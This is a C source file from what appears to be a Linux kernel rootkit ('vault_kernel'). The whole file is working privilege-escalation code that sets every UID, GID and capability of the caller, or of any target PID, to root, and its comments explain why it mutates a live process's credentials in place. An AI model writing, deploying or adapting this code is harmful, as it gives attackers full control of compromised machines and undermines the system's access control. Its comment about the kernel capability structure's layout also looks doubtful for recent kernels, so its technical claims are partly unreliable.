/* vault_kernel - priv_esc.c
 * Privilege escalation: give root credentials to the caller or to
 * any arbitrary PID.
 *
 * Two paths:
 *  - self  (pid <= 0 or own pid): the canonical prepare_creds() +
 *          commit_creds() sequence.  Clean and race-free.
 *  - remote (other pid):          struct cred objects are meant to
 *          be immutable once published, so instead of swapping the
 *          task's cred pointers (which leaks the old credentials
 *          and races with RCU readers) we mutate the target's cred
 *          IN PLACE under task_lock().  Threads of the target share
 *          the same cred object, so the whole process becomes root.
 *
 * The previous implementation called commit_creds() regardless of
 * the requested PID — which rooted the CALLER, not the target —
 * and then read task->comm after put_pid() (use-after-free).
 * ruby570bocadito © 2026
 */
#include "core.h"

static void vk_rootify_creds(struct cred *creds) {
    creds->uid.val   = 0;
    creds->euid.val  = 0;
    creds->suid.val  = 0;
    creds->fsuid.val = 0;
    creds->gid.val   = 0;
    creds->egid.val  = 0;
    creds->sgid.val  = 0;
    creds->fsgid.val = 0;

    /* kernel_cap_t is { __u32 cap[2]; } on every supported kernel
     * (cap_set_full() no longer exists in modern kernels). */
    creds->cap_effective.cap[0]   = ~0U;
    creds->cap_effective.cap[1]   = ~0U;
    creds->cap_permitted.cap[0]   = ~0U;
    creds->cap_permitted.cap[1]   = ~0U;
    creds->cap_inheritable.cap[0] = ~0U;
    creds->cap_inheritable.cap[1] = ~0U;

    creds->securebits = 0;
}

int priv_esc_give_root(pid_t pid) {
    struct task_struct *task;
    struct cred *creds;

    /* ---- Path 1: caller itself (default when no PID given) ---- */
    if (pid <= 0 || pid == current->pid) {
        creds = prepare_creds();
        if (!creds)
            return -ENOMEM;

        vk_rootify_creds(creds);
        commit_creds(creds);

        pr_info(VAULT_KERNEL_TAG " gave root to self (pid %d, comm %s)\n",
                current->pid, current->comm);
        return 0;
    }

    /* ---- Path 2: arbitrary target PID ---- */
    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (task)
        get_task_struct(task);   /* pin the task outside RCU */
    rcu_read_unlock();

    if (!task) {
        pr_warn(VAULT_KERNEL_TAG " give_root: PID %d not found\n", pid);
        return -ESRCH;
    }

    task_lock(task);

    creds = (struct cred *)task->cred;
    if (!creds) {
        task_unlock(task);
        put_task_struct(task);
        return -ESRCH;
    }

    vk_rootify_creds(creds);
    /* Processes normally share real_cred == cred; only keyring
     * tricks split them.  Cover both objects if they differ. */
    if (task->real_cred && task->real_cred != task->cred)
        vk_rootify_creds((struct cred *)task->real_cred);

    pr_info(VAULT_KERNEL_TAG " gave root to PID %d (%s)\n",
            pid, task->comm);   /* comm read while task ref is held */

    task_unlock(task);
    put_task_struct(task);

    return 0;
}
